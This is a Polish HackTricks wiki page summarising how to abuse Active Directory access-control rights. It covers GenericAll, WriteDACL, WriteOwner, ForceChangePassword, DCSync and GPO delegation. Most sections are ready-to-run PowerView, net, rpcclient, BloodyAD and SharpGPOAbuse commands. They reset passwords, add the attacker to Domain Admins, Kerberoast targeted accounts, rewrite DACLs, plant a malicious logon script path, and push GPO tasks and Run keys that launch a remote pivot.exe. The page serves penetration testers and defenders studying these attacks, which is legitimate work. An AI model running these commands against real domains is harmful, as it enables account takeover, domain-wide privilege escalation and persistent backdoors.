# Wykorzystywanie Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona jest głównie podsumowaniem technik z** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Aby uzyskać więcej szczegółów, sprawdź oryginalne artykuły.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll prawa na użytkowniku**

To uprawnienie daje atakującemu pełną kontrolę nad docelowym kontem użytkownika. Gdy prawa `GenericAll` są potwierdzone za pomocą polecenia `Get-ObjectAcl`, atakujący może:

- **Zmień hasło celu**: Przy użyciu `net user <username> <password> /domain` atakujący może zresetować hasło użytkownika.
- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby uczynić je kerberoastable, następnie użyj Rubeus i targetedKerberoast.py, aby wyodrębnić i spróbować złamać hashe ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Wyłącz pre-authentication dla użytkownika, czyniąc jego konto podatnym na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll — prawa do grupy**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupie, jeśli ma on prawa `GenericAll` do grupy takiej jak `Domain Admins`. Po zidentyfikowaniu nazwy rozróżniającej grupy (distinguished name) przy użyciu `Get-NetGroup`, atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub używając modułów takich jak Active Directory lub PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Z Linuxa możesz także wykorzystać BloodyAD, aby dodać siebie do dowolnych grup, gdy posiadasz nad nimi członkostwo GenericAll/Write. Jeśli grupa docelowa jest zagnieżdżona w “Remote Management Users”, natychmiast uzyskasz dostęp WinRM na hostach respektujących tę grupę:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Umożliwia przejęcie obiektu komputera.
- **Shadow Credentials**: Wykorzystaj tę technikę, aby podszyć się pod obiekt komputera lub konto użytkownika, wykorzystując uprawnienia do utworzenia shadow credentials.

## **WriteProperty on Group**

Jeśli użytkownik ma `WriteProperty` rights on all objects for a specific group (e.g., `Domain Admins`), może:

- **Add Themselves to the Domain Admins Group**: Osiągalne przez połączenie poleceń `net user` i `Add-NetGroupUser`, ta metoda umożliwia eskalację uprawnień w domenie.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ten przywilej umożliwia atakującym dodanie siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń, które bezpośrednio modyfikują członkostwo w grupie. Użycie następującej sekwencji poleceń pozwala na samododanie:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Podobne uprawnienie — pozwala atakującym bezpośrednio dodać siebie do grup przez modyfikację właściwości grup, jeśli mają prawo `WriteProperty` na tych grupach. Potwierdzenie i wykonanie tego uprawnienia odbywa się za pomocą:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie `ExtendedRight` na użytkowniku dla `User-Force-Change-Password` pozwala na reset hasła bez znajomości bieżącego hasła. Weryfikację tego prawa i jego wykorzystanie można przeprowadzić za pomocą PowerShell lub alternatywnych narzędzi w wierszu poleceń, które oferują kilka metod resetowania hasła użytkownika, w tym sesje interaktywne oraz one-liners dla środowisk nieinteraktywnych. Polecenia obejmują proste wywołania PowerShell aż po użycie `rpcclient` na Linuxie, demonstrując wszechstronność attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Jeśli atakujący stwierdzi, że ma prawa `WriteOwner` do grupy, może zmienić właściciela grupy na siebie. Ma to szczególne znaczenie, gdy grupa to `Domain Admins`, ponieważ zmiana właściciela umożliwia szerszą kontrolę nad atrybutami grupy i członkostwem. Proces polega na zidentyfikowaniu właściwego obiektu za pomocą `Get-ObjectAcl`, a następnie użyciu `Set-DomainObjectOwner` do zmodyfikowania właściciela, albo przez SID, albo przez nazwę.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

To uprawnienie pozwala atakującemu modyfikować właściwości użytkownika. Konkretnie, mając dostęp `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby przy logowaniu uruchomić złośliwy skrypt. Osiąga się to za pomocą polecenia `Set-ADObject`, aby zaktualizować właściwość `scriptpath` docelowego użytkownika tak, aby wskazywała na skrypt atakującego.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group

Dzięki temu uprawnieniu atakujący mogą manipulować członkostwem w grupie, np. dodając siebie lub innych użytkowników do określonych grup. Proces obejmuje utworzenie obiektu poświadczeń, użycie go do dodawania lub usuwania użytkowników z grupy oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD oraz uprawnień `WriteDACL` do niego umożliwia atakującemu przyznanie sobie uprawnień `GenericAll` do tego obiektu. Jest to osiągane poprzez manipulację ADSI, co pozwala na pełną kontrolę nad obiektem i możliwość modyfikowania jego członkostw w grupach. Mimo to istnieją ograniczenia przy próbach wykorzystania tych uprawnień za pomocą cmdletów modułu Active Directory `Set-Acl` / `Get-Acl`.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacja w domenie (DCSync)**

Atak DCSync wykorzystuje konkretne uprawnienia replikacji w domenie, aby naśladować Domain Controller i synchronizować dane, w tym poświadczenia użytkowników. Ta potężna technika wymaga uprawnień takich jak `DS-Replication-Get-Changes`, co pozwala atakującemu wyciągnąć wrażliwe informacje ze środowiska AD bez bezpośredniego dostępu do kontrolera domeny. [**Dowiedz się więcej o ataku DCSync tutaj.**](../dcsync.md)

## Delegacja GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegacja GPO

Delegowany dostęp do zarządzania Group Policy Objects (GPO) może stwarzać poważne ryzyko bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` otrzyma prawa do zarządzania GPO, może mieć uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Uprawnienia te mogą być nadużyte w celach złośliwych — można je wykryć za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Wyliczanie uprawnień GPO

Aby zidentyfikować nieprawidłowo skonfigurowane GPO, można łączyć cmdlet-y z PowerSploit. Pozwala to odkryć GPO, którymi konkretny użytkownik może zarządzać: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery objęte daną polityką**: Można ustalić, do których komputerów dana GPO jest zastosowana, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Polityki zastosowane na danym komputerze**: Aby zobaczyć, jakie polityki są zastosowane na konkretnym komputerze, można użyć poleceń takich jak `Get-DomainGPO`.

**Jednostki organizacyjne (OU) objęte daną polityką**: Identyfikację OU, na które wpływa dana polityka, można przeprowadzić za pomocą `Get-DomainOU`.

Można też użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound) do enumeracji GPO i wykrywania problemów w nich.

### Abuse GPO - New-GPOImmediateTask

Nieprawidłowo skonfigurowane GPO można wykorzystać do wykonania kodu, na przykład przez utworzenie natychmiastowego zadania zaplanowanego. Można to wykorzystać do dodania użytkownika do lokalnej grupy administratorów na zaatakowanych maszynach, co znacząco podnosi uprawnienia:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, jeśli jest zainstalowany, pozwala na tworzenie i łączenie nowych GPOs oraz ustawianie preferencji, takich jak wartości rejestru, które uruchomią backdoors na dotkniętych komputerach. Ta metoda wymaga zaktualizowania GPO i zalogowania się użytkownika do komputera, aby doszło do wykonania:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferuje metodę nadużycia istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do utworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

Aktualizacje GPO zwykle odbywają się co około 90 minut. Aby przyspieszyć ten proces, szczególnie po wprowadzeniu zmiany, na docelowym komputerze można użyć polecenia `gpupdate /force`, aby wymusić natychmiastową aktualizację zasad. To polecenie zapewnia, że wszelkie modyfikacje GPO zostaną zastosowane bez oczekiwania na następny cykl automatycznej aktualizacji.

### Under the Hood

Po sprawdzeniu Scheduled Tasks dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Zadania te są tworzone za pomocą skryptów lub narzędzi wiersza poleceń mających na celu modyfikację zachowania systemu lub eskalację uprawnień.

Struktura zadania, przedstawiona w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask`, określa szczegóły zaplanowanego zadania — w tym polecenie do wykonania i jego wyzwalacze. Ten plik pokazuje, jak Scheduled Tasks są definiowane i zarządzane w GPO, dostarczając sposób na wykonywanie dowolnych poleceń lub skryptów w ramach egzekwowania zasad.

### Users and Groups

GPO umożliwiają również manipulowanie członkostwem użytkowników i grup na systemach docelowych. Poprzez bezpośrednie edytowanie plików polityki Users and Groups atakujący mogą dodawać użytkowników do grup uprzywilejowanych, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegacji uprawnień do zarządzania GPO, która pozwala na modyfikowanie plików polityki w celu dodania nowych użytkowników lub zmiany członkostw w grupach.

Plik konfiguracyjny XML dla Users and Groups opisuje, jak te zmiany są wdrażane. Dodając wpisy do tego pliku, konkretnym użytkownikom można przyznać podwyższone uprawnienia na objętych systemach. Ta metoda oferuje bezpośrednie podejście do eskalacji uprawnień poprzez manipulację GPO.

Ponadto można rozważyć dodatkowe metody wykonywania kodu lub utrzymywania persistence, takie jak wykorzystanie skryptów logon/logoff, modyfikowanie kluczy rejestru dla autoruns, instalowanie oprogramowania za pomocą plików .msi lub edytowanie konfiguracji usług. Techniki te zapewniają różne sposoby utrzymania dostępu i kontroli nad systemami docelowymi poprzez nadużycie GPO.

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
